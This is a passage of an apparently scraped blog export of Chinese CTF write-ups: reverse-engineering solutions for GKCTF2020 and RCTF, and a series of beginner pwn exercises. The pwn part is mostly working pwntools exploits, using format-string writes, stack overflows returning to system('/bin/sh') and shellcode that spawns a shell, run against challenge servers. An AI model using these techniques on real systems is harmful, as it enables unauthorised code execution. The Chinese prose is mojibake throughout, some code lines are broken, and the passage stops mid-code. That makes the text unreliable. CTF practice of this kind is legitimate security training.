\u0026#34;failed!\\n\u0026#34;; } else { if ( siep != \u0026#39;#\u0026#39; ) { LABEL_27: map[local] = \u0026#39;o\u0026#39;; goto LABEL_28; } v10 = \u0026#34;success! flag is flag{md5(input)}\\n\u0026#34;; } value1 = 16; DbgPrint(v10); local = value1; goto LABEL_27; } } LABEL_29: if ( *(_BYTE *)(v2 + 65) ) *(_BYTE *)(*(_QWORD *)(v2 + 184) + 3i64) |= 1u; return *(unsigned int *)(v2 + 48); } ä¹ä¸€çœ‹ local çš„å˜åŒ–æœ‰äº›åœ°æ–¹æ¯«æ— ç« æ³•,å†ä»”ç»†ä¸€çœ‹å‘ç°æ˜¯ç”¨æ¥åˆ¤æ–­æ˜¯å¦åˆ°åº•çš„,å¦‚æœåˆ°è¾¹ç•Œå°±ä»å¦ä¸€è¾¹å‡ºæ¥\nmap: # o X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X # X å› ä¸ºæ˜¯é©±åŠ¨æ–‡ä»¶æ‰€ä»¥å­—ç¬¦æ˜¯ä»¥é”®ç›˜æ‰«æç çš„å½¢å¼è¾“å…¥çš„\nå¯¹åº”è¡¨ï¼š https://blog.csdn.net/wenweimin/article/details/105561\næ³¨æ„é”®ç›˜æ‰«æç å…¨æ˜¯å¤§å†™\næŠŠè¿·å®«èµ°å‡ºæ¥è½¬md5\nLKKKLLKLKKKLLLKKKLLLLLL flag{403950a6f64f7fc4b655dea696997851}\nChelly\u0026rsquo;s identity # è¿™ä¸ªé¢˜è¿˜æ¯”è¾ƒæœ‰æ„æ€,å¯æƒœè¿˜æ˜¯å•å­—èŠ‚åŠ å¯†\nç›´æ¥åŠ¨è°ƒåˆ°åŠ å¯†ä½ç½®\ndemo # _DWORD *flag;//æ³¨æ„flagå˜æˆintäº† while ( flag != (_DWORD *)v6 ) { v5 = 0; v4 = 0; for ( i = (_DWORD *)sub_3B1325(\u0026amp;v8, 0); *i \u0026lt; *flag; i = (_DWORD *)sub_3B1325(\u0026amp;v8, v4) ) v5 += *(_DWORD *)sub_3B1325(\u0026amp;v8, v4++); *flag ^= v5; ++flag; } å‡½æ•°sub_3B1325é‡Œé¢çš„ä¸œè¥¿å¾ˆä¸çŸ¥æ‰€äº‘,ç›´æ¥çœ‹æ±‡ç¼–ç®—äº†\nå‘ç°è¿™é‡Œä»ä¸€ä¸ªç´ æ•°è¡¨å–æ•°å’Œflagçš„å€¼åšå¯¹æ¯”ï¼Œå¼‚æˆ–å€¼æ˜¯ç´ æ•°ç´¯åŠ çš„å€¼ï¼Œåˆ†æå¾—å‡ºç®—æ³•ï¼š\ndome # l=[2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97, 101, 103, 107, 109, 113, 127] # læ˜¯ç´ æ•°è¡¨ s1=[]#å‰nä¸ªç´ æ•°å’Œ for i in range(len(l)): ans+=l[i] print(ans,i,l[i]) s1.append(ans) s=\u0026#34;Che11y_1s_EG0IST\u0026#34; s2=[] for i in s:#æ˜¯æ˜¯flag for j in range(len(l)): if l[j] \u0026gt;= ord(i): s2.append((ord(i)^(s1[j-1]))) çˆ†ç ´å°±è¡Œäº†ï¼š\nexp # encode=[438,1176,1089,377,377,1600,924,377,1610,924,637,639,376,566,836,830] s=\u0026#34;!\\\u0026#34;#$%\u0026amp;\\\u0026#39;()*+,-./0123456789:;\u0026lt;=\u0026gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\\\]^_`abcdefghijklmnopqrstuvwxyz{|}\u0026#34; tab =[129, 130, 131, 132, 133, 227, 226, 237, 236, 196, 197, 309, 308, 311, 310, 376, 377, 378, 379, 380, 381, 331, 330, 325, 324, 327, 326, 388, 389, 459, 458, 437, 436, 439, 438, 636, 637, 638, 639, 567, 566, 642, 643, 644, 645, 646, 647, 839, 838, 837, 836, 830, 831, 828, 829, 818, 819, 921, 920, 927, 926, 925, 924, 931, 930, 1094, 1095, 1088, 1089, 1263, 1262, 1176, 1177, 1178, 1179, 1335, 1334, 1446, 1447, 1464, 1465, 1611, 1610, 1613, 1612, 1615, 1614, 1601, 1600, 1603, 1602, 1605, 1604] # tabæ˜¯sçš„å¯†æ–‡ for i in encode: print(s[tab.index(i)],end=\u0026#39;\u0026#39;) Che11y_1s_EG0IST\nEzMachine # è™šæ‹Ÿæœºï¼Œå…ˆæ‰¾vmçš„éƒ¨åˆ†ï¼š\nè¿™ä¸ªå¤§å¾ªç¯åŸºæœ¬å°±æ˜¯vmçš„ä¸»ä½“äº†,é€šè¿‡æ”¹å˜è¿™ä¸ª call è°ƒç”¨çš„å‡½æ•°æ¥ä¼ é€’å‚æ•°å’Œå¯¹flagè¿›è¡Œè®¡ç®—\nç»è¿‡æ¼«é•¿çš„è°ƒè¯•å‘ç°åœ¨å–ä»flagä¸­å–å­—ç¬¦ä¸²çš„å‡½æ•°åä¼šè°ƒç”¨å¥½å‡ ä¸ªç”¨å‡æ³•æ¥è¿›è¡Œå¯¹æ¯”çš„å‡½æ•°,å‘ç°ç¨‹åºç”¨è¿™ç§æ–¹å¼æ¥åˆ¤æ–­å­—ç¬¦ä¸²çš„èŒƒå›´\n.text:00E81300 cheak proc near ; DATA XREF: .data:00EC4954â†“o .text:00E81300 mov edx, time .text:00E81306 movzx eax, byte ptr unk_EC49A2[edx] .text:00E8130D mov ecx, ds:off_EC27FC[eax*4] .text:00E81314 movzx eax, byte_EC49A1[edx] .text:00E8131B add edx, 3 .text:00E8131E mov time, edx .text:00E81324 mov eax, ds:off_EC27FC[eax*4] .text:00E8132B mov eax, [eax] .text:00E8132D sub eax, [ecx] \u0026lt;------ flagå€¼ å‡å» å¯¹æ¯”å€¼ é€šè¿‡ç»“æœçš„å¤§å°æ¥åˆ¤æ–­å€¼çš„èŒƒå›´ .text:00E8132F mov cheak_return, eax .text:00E81334 retn .text:00E81334 cheak endp ä¹‹åå‡ ä¸ªè®¡ç®—çš„å‡½æ•°æœ‰æ— åˆè®¡ç®—ç¬¦çš„å…³ç³»è¿˜æ¯”è¾ƒæ–¹ä¾¿åˆ†æ,æœ€åå¯ä»¥æå®šåŠ å¯†çš„ä»£ç ,å†è§‚å¯Ÿæœ€åå¯¹æ¯”çš„æ–¹å¼å¯ä»¥æ‰¾åˆ°ä¼ å‚æ–¹å¼\ncipher=[] or i in s1: print(i,end=\u0026#39; \u0026#39;) if \u0026#34;abcdefghijklmnopqrstuvwxyz\u0026#34;.find(i) != -1: cipher.append(((ord(i)^0x47)+1)//0x10) cipher.append(((ord(i)^0x47)+1)%0x10) if \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#34;.find(i) != -1: cipher.append(((ord(i)^0x4b)-1//0x100)) cipher.append(((ord(i)^0x4b)-1%0x100)) elif \u0026#39;_{}\u0026#39;.find(i) !=-1: cipher.append(ord(i)//100) cipher.append(ord(i)%100) cipher=cipher[::-1]#æœ€åå¯¹æ¯”çš„æ—¶å€™åœ¨å†…å­˜é‡Œé¢çš„å€¼æœ‰ç‚¹é­”å¹»,ä½†åŸºæœ¬èƒ½å¼„å‡ºæ¥ åˆæ˜¯å•å­—èŠ‚åŠ å¯†,æŠŠæ‰€æœ‰ç§‘æ˜¾ç¤ºå­—ç¬¦å¼„å‡ºæ¥ä¸€ä¸€å¯¹åº”å†å»æ‰é¢˜ç›®ä¸è¦æ±‚çš„å­—ç¬¦å°±å¯ä»¥äº†\ns1=\u0026#39;!\\\u0026#34;#$%\u0026amp;\\\u0026#39;()*+,-./0123456789:;\u0026lt;=\u0026gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\\\]^_`abcdefghijklmnopqrstuvwxyz{|}\u0026#39; tab =[33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 9, 8, 7, 14, 13, 12, 11, 2, 1, 0, -1, 6, 5, 4, 3, 26, 25, 24, 23, 30, 29, 28, 27, 18, 17, 16, 91, 92, 93, 94, 95, 96, 39, 38, 37, 36, 35, 34, 33, 48, 47, 46, 45, 44, 43, 42, 41, 56, 55, 54, 53, 52, 51, 50, 49, 64, 63, 62, 123, 124, 125] ans=[0x22,0x2c,0x27,0x21,0x7b,0x17,0x33,0x25,0x30,0x5f,0x9,0x5f,0xd,0x10,0x1c,0x5,0x7d] for i in ans: for j in range(len(tab)): if tab[j] == i: print(s1[j],end=\u0026#39;\u0026#39;) ç„¶åæŠŠé¢˜ç›®ä¸è¦æ±‚çš„å­—ç¬¦å»æ‰\nf,l\u0026rsquo;a!g{S3u%c0h_A_EZVM} flag{Such_A_EZVM}\nDbgIsFun # æ™šä¸Šé—²ç€æ²¡äº‹å°±å¹²è„†åšäº†ï¼Œæ˜å¤©æŠŠå‰©ä¸‹çš„éƒ½åšäº†å§ï¼Œæ‰¾ä¸åˆ°wpåè€Œæ›´åˆºæ¿€äº†\nå¼€å±€å°±çœ‹åˆ°TLS,åè°ƒè¯•é¢„å®šï¼Œè°ƒè¯•åå‘ç°ä¸­é—´çš„å¼‚æˆ–æ˜¯å†è§£smcï¼Œä¼—æ‰€å‘¨çŸ¥å•å±‚smcå’Œæ²¡æœ‰æ˜¯ä¸€æ ·çš„ï¼ˆxï¼‰\nä¸‹æ–­ç‚¹çœ‹çœ‹ sub_4010F0 é‡Œé¢\ndemo: # while ( !dword_41A8E0 ) Sleep(0x3E8u); for ( i = 0; i \u0026lt; 140; ++i ) byte_41A8DE += *((_BYTE *)\u0026amp;loc_401540 + i); for ( i = 0; flag[i]; ++i ) flag[i] ^= byte_41A8DE; v10 = 71; v11 = 75; v12 = 67; v13 = 84; v14 = 70; for ( j = 0; j \u0026lt; 256; ++j ) list[j] = j; for ( j = 0; j \u0026lt; 256; ++j ) v8[j] = *((_BYTE *)\u0026amp;v10 + 4 * (j % 5)); v20 = 0; for ( j = 0; j \u0026lt; 256; ++j ) { v20 = (v8[j] + list[j] + v20) % 256; v17 = list[j]; list[j] = list[v20]; list[v20] = v17; } v18 = len; v16 = 0; v20 = 0; j = 0; while ( 1 ) { v4 = v18--; if ( !v4 ) break; j = (j + 1) % 256; v20 = (list[j] + v20) % 256; v17 = list[j]; list[j] = list[v20]; list[v20] = v17; v15 = (list[v20] + list[j]) % 256; Sbox[v16++] = list[v15]; } for ( j = 0; j \u0026lt; len; ++j ) v23[j] = LOBYTE(Sbox[j]) ^ flag[j]; v22 = v23; if ( j != len \u0026amp;\u0026amp; j == len ) JUMPOUT(0xD04FE8DB); v5 = 0; while ( v5 \u0026lt; len ) { if ( v22[v5] != *(_BYTE *)(v5 + 4199594) ) { sub_401640(4199659, v25); sub_405183(0); break; } if ( ++v5 ) { if ( !v5 ) JUMPOUT(0x6EAF8766u); } } sub_401640(\u0026#34;right\\n\u0026#34;, v24); sub_403AFA(); return 0; } ååˆ†æ˜æ˜¾çš„RC4ï¼Œrc4ä¹‹å‰å°†flagæ¯ä¸ªå­—ç¬¦çš„å€¼å¼‚æˆ–ä¸Šäº†0xc9\né¢˜ç›®åˆ°è¿™é‡Œå·²ç»åšå®Œäº†ï¼Œåˆ°0x4014AAé‡Œé¢å»æ‹¿æ•°æ®ç›´æ¥rc4å°±å®Œäº‹äº†\nä½†æ˜¯æ³¨æ„ï¼ŒåŠ¨è°ƒæ—¶å’ŒéåŠ¨è°ƒæ—¶å†…å­˜0x4014AAé‡Œé¢çš„å€¼å› ä¸ºsmcè§£ç çš„åŸå› ï¼Œæ‰€ä»¥æ˜¯ä¸ä¸€æ ·çš„\nç„¶åç»§ç»­åŠ¨è°ƒå¯ä»¥å‘ç°å‰é¢çš„rc4å‡½æ•°æ˜¯å¯ä»¥è¿›å»çš„ï¼Œä½†æ˜¯å› ä¸ºåè°ƒè¯•ï¼Œflagçš„è¾“å…¥è¢«è·³è¿‡äº†ï¼Œä½†æ˜¯è¿™å¹¶ä¸å½±å“åç»­æµç¨‹\nè¿™é‡ŒSleepçš„è®¡æ—¶å™¨å› ä¸ºæ²¡æœ‰pdbæ–‡ä»¶æ‰€ä»¥ä¼šå‡ºé”™,æ”¹dword_41A8E0çš„å€¼è·³è¿‡\nå‡ºç°åœ¨æ•°æ®æ®µçš„ç¥å¿…å­—ç¬¦ä¸²ï¼š X:\\I_am_afraid_there_is_no_PDB_file_for_you_my_friend:D\nwhile ( !dword_41A8E0 ) Sleep(0x3E8u); å› ä¸ºæ²¡æœ‰ flag è¾“å…¥æ‰€ä»¥ len æ˜¯0ï¼Œè¿™é‡Œæ˜¯å¯ä»¥è‡ªå·±ç®—çš„ï¼Œä½†ä½œä¸ºä¸€æ¡æ‡’ç‹—å®Œå…¨ä½“ï¼Œèƒ½è®©ç¨‹åºåšçš„äº‹æƒ…æˆ‘ä»¬åšå†³ä¸åš\nbraekpoint # v18 = len; \u0026lt;---æ”¹å¤§ä¸€ç‚¹ v16 = 0; v20 = 0; j = 0; while ( 1 ) { v4 = v18--; if ( !v4 ) break; j = (j + 1) % 256; v20 = (list[j] + v20) % 256; v17 = list[j]; list[j] = list[v20]; list[v20] = v17; v15 = (list[v20] + list[j]) % 256; Sbox[v16++] = list[v15]; } for ( j = 0; j \u0026lt; len; ++j ) \u0026lt;---ä¸‹æ–­ç‚¹æ‹¿æ•°æ® v23[j] = LOBYTE(Sbox[j]) ^ flag[j]; exp # encode=[0x2d,0xd4,0xf,0xd0,0x54,0xee,0x75,0xd0,0xe0,0x30,0x96,0xe1,0x79,0x8a,0xe0,0xfe,0x18,0x3a,0x27,0xe7,0x2f,0x86,0xc9,0xfe,0x66,0x43,0xa7,0x75,0x33,0xdb,0x8b,0xd,0xe4,0xa8,0x41,0x0,0x3b,0xd9,0x7d,0x38,0x8b,0x85,0xf8,0xff,0xfe,0xff,0x8a,0x4,0x18,0x8a,0x93,0xaa,0x14,0x40,0x0,0x3a,0xc2,0x75,0x14,0x43,0x74,0xe0,0x75,0xde] key = [0x82,0x71,0xa7,0x7e,0xe6,0x12,0xc8,0x78,0x50,0xcd,0x28,0x49,0xc9,0x5,0x5b,0x7,0xbc,0xcb,0x9c,0x4b,0x87,0x24,0x70,0x7,0xc6,0xe4,0x1a,0xc1,0xe5,0x1b,0x13,0x3c,0x87,0x85,0xde,0xa4,0x77,0xae,0xdb,0x9b,0xb7,0x40,0x11,0x4a,0xc3,0xc,0x1b] print(\u0026#39;\u0026#39;) for i in range(28): print(chr((key[i]^encode[i])^0xc9),end=\u0026#39;\u0026#39;) flag{5tay4wayFr0m8reakp0int}\n","date":"16 June 2020","permalink":"/achieve/2019to2021/gkctf2020%E9%80%86%E5%90%91wp/","section":"archive","summary":"å‘ç°GKCTFåœ¨buuä¸Šé¢æŒ‚äº†å¥½ä¹…ï¼Œå¹²è„†åšç€ç©ç©å¥½äº†","title":"GkCTF2020é€†å‘wp"},{"content":"\rstringï¼š # æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ x64ä¼ å‚è§„åˆ™ æŠ„æ¥çš„åŸç† # åŸç†æŒºåº•å±‚çš„ï¼Œå¾—è®¤çœŸçœ‹çœ‹ https://blog.csdn.net/qq_43394612/article/details/84900668\nputs(\u0026#34;A voice heard in your mind\u0026#34;); puts(\u0026#34;\u0026#39;Give me an address\u0026#39;\u0026#34;); _isoc99_scanf(\u0026#34;%ld\u0026#34;, \u0026amp;address);//åˆ©ç”¨è¿™ä¸ªä¼ ä¸€ä¸ªåœ°å€è¿›å» puts(\u0026#34;And, you wish is:\u0026#34;); _isoc99_scanf(\u0026#34;%s\u0026#34;, \u0026amp;format); puts(\u0026#34;Your wish is\u0026#34;); printf(\u0026amp;format); //å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ å¯ä»¥æ”¹å˜åœ°å€å†…çš„å€¼ puts(\u0026#34;I hear it, I hear it....\u0026#34;); expï¼š # from pwn import * context.arch=\u0026#39;amd64\u0026#39; # æ˜ç¡®ç¨‹åºç±»å‹ä¸åŒç³»ç»Ÿç”Ÿæˆçš„shellcraft.sh()ä¸åŒ io = process(\u0026#39;./string\u0026#39;) io.recvuntil(\u0026#34;secret[0] is \u0026#34;) addr = int(io.recvuntil(\u0026#34;\\n\u0026#34;)[:-1], 16)# æ¥æ”¶å±å¹•æ‰“å°å‡ºæ¥çš„åœ°å€ io.sendlineafter(\u0026#34; character\u0026#39;s name be:\u0026#34;,\u0026#39;cxk\u0026#39;) io.sendlineafter(\u0026#34; go?east or up?:\u0026#34;,\u0026#39;east\u0026#39;) io.sendlineafter(\u0026#34;go into there(1), or leave(0)?:\u0026#34;,\u0026#39;1\u0026#39;) io.sendlineafter(\u0026#34;\u0026#39;Give me an address\u0026#39;\u0026#34;, str(int(addr)))# å°†åœ°å€æ”¾å…¥æ ˆå†… io.sendlineafter(\u0026#34;you wish is:\u0026#34;,\u0026#34;%85c%7$n\u0026#34;) # æ”¹å˜åœ°å€æŒ‡å‘çš„å€¼ï¼ˆå³æ”¹ç¬¬8ä¸ªå‚æ•°ï¼‰ shellcode = asm(shellcraft.sh())# å°†shellcodeè½¬æˆæœºæ¢°ç  io.sendlineafter(\u0026#34;USE YOU SPELL\u0026#34;, shellcode) io.interactive() 85c%7$næ˜¯æ”¹å‚æ•°çš„å…¶ä¸­ä¸€ç§æ–¹æ³•\nCGfsbï¼š # æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ x86ä¼ å‚è§„åˆ™ memset(\u0026amp;s, 0, 0x64u); puts(\u0026#34;please tell me your name:\u0026#34;); read(0, \u0026amp;buf, 10u); puts(\u0026#34;leave your message please:\u0026#34;); fgets(\u0026amp;s, 100, stdin); printf(\u0026#34;hello %s\u0026#34;, \u0026amp;buf);//åˆ©ç”¨è¿™ä¸ªæŠŠ pwnme pwnæ‰ puts(\u0026#34;your message is:\u0026#34;); printf(\u0026amp;s); if ( pwnme == 8 ) { puts(\u0026#34;you pwned me, here is your flag:\\n\u0026#34;); system(\u0026#34;cat flag\u0026#34;); } é”™è¯¯çš„exp # add = 0x0804A068 io.recvuntil(\u0026#34;please tell me your name:\u0026#34;) payload = p32(add) io.sendline(payload) io.recvuntil(\u0026#34;leave your message please:\u0026#34;) io.sendline(b\u0026#39;%8c%2$n\u0026#39;) io.interactive() printf(a)æ‰èƒ½ç”¨\næ­£ç¡®çš„exp # from pwn import * io = remote(\u0026#34;220.249.52.133\u0026#34;,35348) add = 0x0804A068 io.recvuntil(\u0026#34;please tell me your name:\u0026#34;) io.sendline(\u0026#39;cxk\u0026#39;) io.recvuntil(\u0026#34;leave your message please:\u0026#34;) io.sendline(p32(0x0804A068) + b\u0026#39;%c%10$n\u0026#39;) # è°ƒè¯•ä¸€ä¸‹å¯ä»¥çœ‹åˆ°è¿™é‡Œçš„æ•°æ®è¢«åŸå°ä¸åŠ¨æ”¾åˆ°äº† esp åé¢ï¼ŒæŒ‰ç…§ x86 çš„è§„å¾‹æ•°ä¸€ä¸‹å¯ä»¥çœ‹åˆ° 0x0804A068 åœ¨ç¬¬åä¸ªå‚æ•°çš„ä½ç½® ï¼Œåœ¨è¿™é‡Œ p32(0x0804A068) å·²ç»å äº†4ä¸ªç”¨äºè¾“å‡ºçš„ä½ç½®è¿˜éœ€è¦4ä¸ªè¾“å‡ºå­—ç¬¦æ‰èƒ½å¤Ÿå°†åœ°å€æŒ‡å‘çš„å‚æ•°pwn_meæ”¹æˆ8 io.interactive() cgpwn2 # æ„é€ payloadæ‰“return gets(\u0026amp;s);\nè¿”å›å‡½æ•°è¦†ç›–ä¸º\nexp: # from pwn import * r = remote(\u0026#34;220.249.52.133\u0026#34;, 59988) system=0x08048420 r.recvuntil(\u0026#39;name\u0026#39;) r.sendline(\u0026#34;/bin/sh\u0026#34;) name=0x0804A080 payload = b\u0026#39;a\u0026#39; * (0x26+4) + p32(system)+p32(0)+p32(0x0804A080) # å› ä¸º32ä½å‡½æ•°å’Œå‚æ•°ä¸­é—´æ˜¯systemçš„ è¿”å›åœ°å€ç”¨ p32(0)å¡«å…… r.sendline(payload) #print(r.recv()) #print(r.recv()) r.interactive() # 0804A024 /bin/sh # 08048320 system int_overflow # åˆ©ç”¨å°æ•´å‹ï¼ˆint8ï¼‰æº¢å‡ºç»•è¿‡æ£€æµ‹ç‚¹ æ ˆæº¢å‡ºæ”¹å˜ç¨‹åºæµç¨‹ char *__cdecl check_passwd(char *str) { char *result; // eax char dest; // [esp+4h] [ebp-14h] unsigned __int8 v3; // [esp+Fh] [ebp-9h] v3 = strlen(str);//v3å¤§äº255åæº¢å‡º if ( v3 \u0026lt;= 3u || v3 \u0026gt; 8u ) { puts(\u0026#34;Invalid Password\u0026#34;); result = (char *)fflush(stdout); } else { puts(\u0026#34;Success\u0026#34;); fflush(stdout); result = strcpy(\u0026amp;dest, str);//è¦†ç›–dest åçš„r } return result; expï¼š # from pwn import * #è®¾ç½®ç›®æ ‡æœºçš„ä¿¡æ¯ï¼Œç”¨æ¥å»ºç«‹è¿œç¨‹é“¾æ¥ï¼Œurlæˆ–ipæŒ‡æ˜äº†ä¸»æœºï¼Œportè®¾ç½®ç«¯å£ r = remote(\u0026#34;220.249.52.133\u0026#34;, 33284) system=0x0804868B r.sendlineafter(\u0026#34;Your choice:\u0026#34;, \u0026#34;1\u0026#34;) r.sendlineafter(\u0026#34;your username:\u0026#34;, \u0026#34;kk\u0026#34;) r.recvuntil(\u0026#34;your passwd:\u0026#34;) payload = b\u0026#39;a\u0026#39; * (0x14+4) + p32(system) + 231*b\u0026#39;a\u0026#39; #payload=payload.ljust(259,b\u0026#39;a\u0026#39;) print(len(payload)) r.sendline(payload) r.recv() r.interactive() rip # æ ˆæº¢å‡º ç„å­¦é—®é¢˜ int __cdecl main(int argc, const char **argv, const char **envp) { char s; // [rsp+1h] [rbp-Fh] puts(\u0026#34;please input\u0026#34;); gets((__int64)\u0026amp;s, (__int64)argv);//æ‰“è¿™é‡Œ puts(\u0026amp;s); puts(\u0026#34;ok,bye!!!\u0026#34;); return 0; } ä¸­é—´ä¼šç¢°åˆ°ä¸€ä¸ªç„å­¦çš„é—®é¢˜: http://blog.eonew.cn/archives/958\næŠŠæºå­˜å‚¨å™¨å†…å®¹å€¼é€å…¥ç›®çš„å¯„å­˜å™¨,å½“æœ‰m128æ—¶, å†…å­˜åœ°å€å¿…é¡»æ˜¯16å­—èŠ‚å¯¹é½çš„ã€‚ XMMWORDæ—¨åœ¨è¡¨ç¤ºä¸m128ç›¸åŒçš„ç±»å‹,åˆšå¥½è¿™é‡Œç¬¦åˆç¬¬äºŒæ¡ã€‚\nå°±æ˜¯è¯´payloadä¼šå¯¼è‡´æ ˆçš„åœ°å€å¯ä»¥ä¸æ˜¯æŒ‰0x10å¯¹é½çš„ï¼Œä¼šå¯¼è‡´ç¨‹åºcrashæ‰ è¿™æ—¶æ”¹å˜payloadçš„é•¿åº¦æ˜¯è§£å†³æ–¹æ³•ä¹‹ä¸€\nç›´æ¥æ›´æ”¹æˆ‘ä»¬çš„payloadé•¿åº¦ï¼Œåœ¨æ ˆæº¢å‡ºçš„æ—¶å€™æ ˆçš„åœ°å€è‡ªç„¶ä¸åŒï¼Œç„¶åå°†æ ˆåœ°å€+1ï¼Œå¦‚æœä¸è¡Œçš„è¯ï¼Œå°±ç»§ç»­å¢åŠ ï¼Œæœ€å¤šä¹Ÿå°±æ”¹16æ¬¡å°±ä¸€å®šä¼šé‡åˆ°æ ˆå¯¹é½çš„æƒ…å†µã€‚\nexp # from pwn import* sh=remote(\u0026#34;node3.buuoj.cn\u0026#34;,28364) payload=b\u0026#39;a\u0026#39;*23+p64(0x401016)+p64(0x401186) sh.sendline(payload) sh.interactive() ","date":"12 June 2020","permalink":"/achieve/2019to2021/%E5%87%A0%E4%B8%AA%E6%96%B0%E6%89%8Bpwn/","section":"archive","summary":"stringï¼š # æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ x64ä¼ å‚è§„åˆ™ æŠ„æ¥çš„åŸç† # åŸç†æŒºåº•å±‚çš„ï¼Œå¾—è®¤çœŸçœ‹çœ‹ https://blog.","title":"æ–°æ‰‹pwnç»ƒä¹ æ±‡æ€»"},{"content":" å¤ªé©¬äº†ã€‚ã€‚ã€‚ã€‚\nrust-flag # ç”¨rustè¯­è¨€ç¼–å†™ä»£ç çœ‹ç€å¾ˆä¸‘,åŠ å¯†æµç¨‹å´æ„å¤–ç®€å•ã€‚ã€‚ã€‚ã€‚\nåˆ†æ # æ‹–è¿›idaä¸€é¡¿æ“ä½œæ‰¾åˆ°è¾“å…¥,å†å¾€åé¢æ‰¾åˆ°è¾“å‡ºé”™è¯¯çš„å‡½æ•°ï¼Œä¸‹æ–­ç‚¹æ”¹æµç¨‹å‘ç°æ²¡æœ‰è¾“å‡º right äºæ˜¯åˆ¤æ–­åˆ¤æ–­æ­£è¯¯çš„å­—ç¬¦ä¸²åœ¨ä¹‹å‰è¢«è½½å…¥äº†è¦è¾“å‡ºçš„å­—ç¬¦ä¸²ï¼Œäºæ˜¯å¾€å›æ‰¾æ‰¾åˆ°äº†ä¸€ä¸ªå¤§å¾ªç¯ã€‚ã€‚ã€‚ã€‚\nç»™å¾ªç¯ä¸‹æ–­ç‚¹å‘ç°é‡Œé¢æœ‰æ˜æ˜¾ç”¨æ¥åˆ¤æ–­æ•°æ®çš„ cmp æŒ‡ä»¤ï¼Œå¾ªç¯æ¬¡æ•°åˆšå¥½æ˜¯ RCTF{ çš„é•¿åº¦ã€‚ã€‚ã€‚ã€‚\næ›´æ”¹ RCTF{ ä¸ºå…¶ä»–å­—ç¬¦åˆ¤æ–­ä½¿ç”¨äº†å­—ç¬¦ä¸²çš„å‡½æ•°å¹¶è·Ÿè¿›è§‚å¯Ÿå¯„å­˜å™¨çš„å˜åŒ–ï¼ŒæˆåŠŸæ‰¾åˆ°åŠ å¯†flagçš„ä½ç½®\næ¥ä¸‹æ¥è§£æ¯”è¾ƒç®€å•äº†ï¼Œå…ˆä»å†…å­˜ä¸­è¯»å‡ºåŠ å¯†ç”¨çš„ keyï¼Œç”±äºæå–å¯†æ–‡çš„å‡½æ•°è¿‡äºå¥‡æ€ªï¼Œå¹²è„†ä¿®æ”¹æµç¨‹æŠŠæ‰€æœ‰å¯†æ–‡è®°ä¸‹æ¥ã€‚\nexp: # l1=[0x39,0x15,0x22,0xf4,0x95,0x70,0xe5,0x91,0x07,0x3d,0x8d,0xce,0x78,0xc2,0x52,0x9d,0xe1,0x8d,0x2e,0x6e] l=[0x6b,0x56,0x76,0xb2,0xee,0x3,0xb1,0xe3,0x62,0x5c,0xe6,0x91,0x1d,0x93,0x27,0xfc,0x8d,0xf8,0x53,0x64,0xd7,0x25,0xee,0xe3,0xc8,0xab,0x93,0x86,0xa5,0xaf,0x8c,0xaf,0x4a,0xde,0x64,0x33,0x5d,0x18] for i in range(len(l1)): print(chr(l1[i]^l[i]),end=\u0026#39;\u0026#39;) RCTF{sTreak_eQualu}\ncipher # å¤ªç—›è‹¦äº†ã€‚ã€‚ã€‚å†ä¹Ÿä¸æƒ³çœ‹è¿™ä¸ªé¢˜äº†\nå…ˆæ‹–åˆ°ghidraé‡Œé¢çœ‹ä¼ªä»£ç å¤§æ¦‚å¤åŸåæ˜¯è¿™ä¸ªæ ·å­çš„\ndemo: # //i jä¸ºä¸¤ä¸ªcharç±»å‹çš„éšæœºæ•° x = (i \u0026lt;\u0026lt; 56) | (j \u0026lt;\u0026lt; 48); y = 0; a = (flag2 \u0026gt;\u0026gt; 8) + (flag2 \u0026lt;\u0026lt; 56) + flag1 ^ x; b = (flag1 \u0026gt;\u0026gt; 61) + (flag1 \u0026lt;\u0026lt; 3 ) ^ a; i = 0; while (i \u0026lt; 31) { y = ((y \u0026gt;\u0026gt; 8) + (y \u0026lt;\u0026lt; 56) + x) ^ i; x = ((x \u0026gt;\u0026gt; 61) + (x \u0026lt;\u0026lt; 3)) ^ y; a = ((a \u0026gt;\u0026gt; 8) + (a \u0026lt;\u0026lt; 56) + b) ^ x; b = ((b \u0026gt;\u0026gt; 61) + (b \u0026lt;\u0026lt; 3)) ^ a; i = i + 1; } æ³¨æ„ xå’Œ yçš„å˜åŒ–éƒ½æ˜¯ç”±äº’ç›¸çš„å€¼å¼•èµ·çš„ï¼Œæ•… x å’Œ y æœ€ç»ˆçš„çŠ¶æ€åªæœ‰ 0x100^0x100ç§ã€‚é€šè¿‡çˆ†ç ´iã€jå¯ä»¥å¾—åˆ°æœ€ç»ˆçš„xã€y\nçˆ†ç ´demoï¼š # #include\u0026lt;iostream\u0026gt; #include\u0026lt;stdlib.h\u0026gt; using namespace std; int main() { for (uint64_t i = 0; i \u0026lt;= 0xfff; ++i) { for (uint64_t j = 0; j \u0026lt;= 0xfff; ++j) { uint64_t t; uint64_t b = 0x2a00f82be11d77c1; uint64_t a = 0xc3b171fc23d591f4; uint64_t x = (i \u0026lt;\u0026lt; 56) | (j \u0026lt;\u0026lt; 48); uint64_t y = 0; int i=0; while (i\u0026lt;31) { y = ((y \u0026gt;\u0026gt; 8) + (y \u0026lt;\u0026lt; 56) + x) ^ i; x = ((x \u0026gt;\u0026gt; 61) + (x \u0026lt;\u0026lt; 3)) ^ y; i += 1; } uint64_t t1,t2; t1=x; t2=y; i = 31; while (i \u0026gt; 0) { i -= 1; t = a ^ b; b = (t \u0026lt;\u0026lt; 61) + (t \u0026gt;\u0026gt; 3); //b1 t = a ^ x; t -= b; a = (t \u0026lt;\u0026lt; 8) + (t \u0026gt;\u0026gt; 56); t = x ^ y; x = (t \u0026lt;\u0026lt; 61) + (t 